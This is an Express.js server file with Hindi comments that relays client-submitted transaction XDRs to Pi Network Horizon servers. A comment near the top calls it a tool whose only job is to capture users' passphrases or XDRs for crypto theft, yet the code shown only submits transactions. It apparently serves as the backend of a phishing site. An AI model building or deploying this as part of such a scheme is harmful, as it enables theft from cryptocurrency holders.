// जरूरी लाइब्रेरी इम्पोर्ट करें
const express = require('express');
const path = require('path');
const cors = require('cors');
const StellarSdk = require('stellar-sdk');

const app = express();

// --- चेतावनी: यह कोड केवल शैक्षिक उद्देश्यों के लिए है। ---
// --- इसका एकमात्र काम यूजर की निजी जानकारी (जैसे पासफ़्रेज़ या XDR) को कैप्चर करना है। ---
// --- इसका इस्तेमाल किसी की क्रिप्टो चोरी करने के लिए किया जा सकता है, जो एक साइबर अपराध है। ---


// Pi नेटवर्क का Horizon सर्वर
// हम एक नहीं, बल्कि कई सर्वर का उपयोग करेंगे ताकि अगर एक डाउन हो तो दूसरा काम करे।
const PI_HORIZON_SERVERS = [
  'https://api.mainnet.minepi.com',
  'https://horizon.pi.nil.directory', // समुदाय द्वारा संचालित एक और सर्वर
];
let currentServerIndex = 0;

// एक फंक्शन जो अगला उपलब्ध सर्वर चुनेगा
function getPiServer() {
  const serverUrl = PI_HORIZON_SERVERS[currentServerIndex];
  currentServerIndex = (currentServerIndex + 1) % PI_HORIZON_SERVERS.length; // Round-robin
  console.log(`Using Horizon server: ${serverUrl}`);
  return new StellarSdk.Server(serverUrl, {
    allowHttp: true // कुछ सर्वर http पर भी हो सकते हैं (हालांकि mainnet https ही है)
  });
}

// Middleware
app.use(express.json({ limit: '10mb' })); // XDR बड़ा हो सकता है
app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));

// API Endpoint: ट्रांजैक्शन सबमिट करने के लिए
app.post('/api/submitTransaction', async (req, res) => {
  const { xdr } = req.body;

  if (!xdr) {
    return res.status(400).json({ success: false, error: 'XDR is missing' });
  }

  try {
    const server = getPiServer();
    const transaction = StellarSdk.TransactionBuilder.fromXDR(xdr, "Pi Network");

    console.log('Submitting transaction to Pi Network...');
    const txResponse = await server.submitTransaction(transaction);

    console.log('Transaction successful:', txResponse.hash);
    res.json({
      success: true,
      message: 'Transaction submitted successfully!',
      hash: txResponse.hash,
      result: txResponse
    });
  } catch (error) {
    console.error('Horizon Submission Error:', error.response ? error.response.data : error.message);
    
    // Horizon से मिले एरर को फ्रंटएंड को भेजें ताकि यूजर को सही कारण पता चले
    const errorDetails = error.response ? error.response.data : {
        title: "Network Error",
        detail: error.message
    };

    res.status(500).json({
      success: false,
      error: 'Transaction submission failed',
      details: errorDetails
    });
  }
});

// Catch-all: किसी भी अन्य रूट के लिए index.html दिखाएं
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// सर्वर को शुरू करें
const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
